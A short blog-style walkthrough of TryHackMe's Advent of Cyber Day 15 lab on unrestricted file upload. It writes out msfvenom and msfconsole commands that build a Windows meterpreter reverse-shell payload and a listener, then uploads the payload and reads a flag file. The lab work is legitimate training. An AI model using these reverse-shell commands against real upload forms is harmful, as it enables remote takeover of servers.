Advent of Cyber is now regular seasonal room on <a href="https://tryhackme.com/">TryHackMe</a> page.
This is their 4th time and again with awsome story to follow each day's assignment.

Here are my solutions for the Day 15, if anyone gets stuck or need bit of help solving questions.
Today's task is addressing issues of input validation of file upload funtionality and unrestricted file upload vulnerabilities.
If any of these things are implemented during development of the site threat actor can exploit it and get access to the server.

First you need to boot up VM and Attackbox since they will take some time to boot up.

All questions exepct Q3 can be answered by carefully reading task description of vulnerabilities and how to avoid them.

For Q3 we need to create the paypload, we got the command in task description:

<blockquote>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=AttackBox_IP LPORT="Listening port" -f exe -o cv-username.exe</blockquote>

It will take a minute to generate it. It will be saved on attackbox /root folder.

then you run second command to create the listener :

<blockquote>sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST AttackBox_IP; set LPORT 'listening port'; exploit"</blockquote>


After that we can head to the firefox browser and upload the payload file we created with first step.
Now we can open listener window and wait until the file that we uploaded to website will be run.
When connection is active we can move through directories
<ol>
  <li>pwd to check where we are</li>
  <li>cd ../..</li>
  <li> we head to the folder HR Elf's Documents directory</li>
  <li> cat flag.txt </li>
</ol>

I hope anyone who gets stuck finds it helpful<br>
AudiTTRSi
